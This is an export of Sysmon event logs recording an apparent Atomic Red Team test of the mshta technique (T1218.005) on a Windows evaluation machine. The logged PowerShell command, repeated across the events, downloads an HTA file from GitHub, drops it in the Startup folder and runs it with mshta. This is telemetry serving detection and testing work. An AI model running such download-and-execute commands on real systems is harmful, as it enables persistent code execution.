ParentProcessGuid: {f57bd86a-a7c8-658c-d101-000000000f00}

ParentProcessId: 5660

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force}

ParentUser: WINDEV2309EVAL\User",Info,MSHTA.EXE,"""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-a7c8-658c-d101-000000000f00},5660,WINDEV2309EVAL\User,{f57bd86a-a7cb-658c-d301-000000000f00},3588,11308,Internet Explorer,,,,,"
      ",-,,,,,,2023-12-27T22:40:11.6310101Z,,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:40:11.630,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:40:11.6310101Z""/>
      <EventRecordID>19591</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:40:11.630</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a7cb-658c-d301-000000000f00}</Data>
      <Data Name=""ProcessId"">11308</Data>
      <Data Name=""Image"">C:\Windows\System32\mshta.exe</Data>
      <Data Name=""FileVersion"">11.00.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Microsoft (R) HTML Application host</Data>
      <Data Name=""Product"">Internet Explorer</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">MSHTA.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\mshta.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=36D15DDE6D71802D9588CC0D48EDF8EA,SHA256=7B70B26081CFA5FAE721F6E0A63960034D25CC94D157CD649A4E9907B5AF37EA,IMPHASH=DCDEE2FF2311B9AE7C4D768FA56524DD</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a7c8-658c-d101-000000000f00}</Data>
      <Data Name=""ParentProcessId"">5660</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:11.630

ProcessGuid: {f57bd86a-a7cb-658c-d301-000000000f00}

ProcessId: 11308

Image: C:\Windows\System32\mshta.exe

FileVersion: 11.00.22621.2506 (WinBuild.160101.0800)

Description: Microsoft (R) HTML Application host

Product: Internet Explorer

Company: Microsoft Corporation

OriginalFileName: MSHTA.EXE

CommandLine: ""C:\Windows\system32\mshta.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=36D15DDE6D71802D9588CC0D48EDF8EA,SHA256=7B70B26081CFA5FAE721F6E0A63960034D25CC94D157CD649A4E9907B5AF37EA,IMPHASH=DCDEE2FF2311B9AE7C4D768FA56524DD

ParentProcessGuid: {f57bd86a-a7c8-658c-d101-000000000f00}

ParentProcessId: 5660

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:40:11.563,,,,,,,,,11,19590,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: T1023

UtcTime: 2023-12-27 22:40:11.563

ProcessGuid: {f57bd86a-a7c8-658c-d101-000000000f00}

ProcessId: 5660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta

CreationUtcTime: 2023-12-27 22:40:11.563

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a7c8-658c-d101-000000000f00},3588,5660,,,,,,"
      ",T1023,,,,,,2023-12-27T22:40:11.5788947Z,C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta,,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:40:11.563,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:40:11.5788947Z""/>
      <EventRecordID>19590</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">T1023</Data>
      <Data Name=""UtcTime"">2023-12-27 22:40:11.563</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a7c8-658c-d101-000000000f00}</Data>
      <Data Name=""ProcessId"">5660</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:40:11.563</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: T1023

UtcTime: 2023-12-27 22:40:11.563

ProcessGuid: {f57bd86a-a7c8-658c-d101-000000000f00}

ProcessId: 5660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta

CreationUtcTime: 2023-12-27 22:40:11.563

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:40:09.444,,,,,,,,,11,19589,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:40:09.444

ProcessGuid: {f57bd86a-a7c8-658c-cd01-000000000f00}

ProcessId: 5000

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_d0y142wd.cnv.ps1

CreationUtcTime: 2023-12-27 22:40:09.444

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a7c8-658c-cd01-000000000f00},3588,5000,,,,,,"
      ",-,,,,,,2023-12-27T22:40:09.4584008Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_d0y142wd.cnv.ps1,,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:40:09.444,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:40:09.4584008Z""/>
      <EventRecordID>19589</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:40:09.444</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a7c8-658c-cd01-000000000f00}</Data>
      <Data Name=""ProcessId"">5000</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_d0y142wd.cnv.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:40:09.444</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:40:09.444

ProcessGuid: {f57bd86a-a7c8-658c-cd01-000000000f00}

ProcessId: 5000

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_d0y142wd.cnv.ps1

CreationUtcTime: 2023-12-27 22:40:09.444

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:40:09.106,,,,,,,,,11,19588,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:40:09.106

ProcessGuid: {f57bd86a-a7c8-658c-d101-000000000f00}

ProcessId: 5660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_vwxhh0ds.gwu.ps1

CreationUtcTime: 2023-12-27 22:40:09.106

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a7c8-658c-d101-000000000f00},3588,5660,,,,,,"
      ",-,,,,,,2023-12-27T22:40:09.1276949Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_vwxhh0ds.gwu.ps1,,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:40:09.106,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:40:09.1276949Z""/>
      <EventRecordID>19588</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:40:09.106</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a7c8-658c-d101-000000000f00}</Data>
      <Data Name=""ProcessId"">5660</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_vwxhh0ds.gwu.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:40:09.106</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:40:09.106

ProcessGuid: {f57bd86a-a7c8-658c-d101-000000000f00}

ProcessId: 5660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_vwxhh0ds.gwu.ps1

CreationUtcTime: 2023-12-27 22:40:09.106

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,19587,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:08.955

ProcessGuid: {f57bd86a-a7c8-658c-d101-000000000f00}

ProcessId: 5660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a7c8-658c-d101-000000000f00},3588,5660,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:40:08.9567559Z,,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:40:08.955,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:40:08.9567559Z""/>
      <EventRecordID>19587</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:40:08.955</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a7c8-658c-d101-000000000f00}</Data>
      <Data Name=""ProcessId"">5660</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:40:08.955

ProcessGuid: {f57bd86a-a7c8-658c-d101-000000000f00}

ProcessId: 5660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
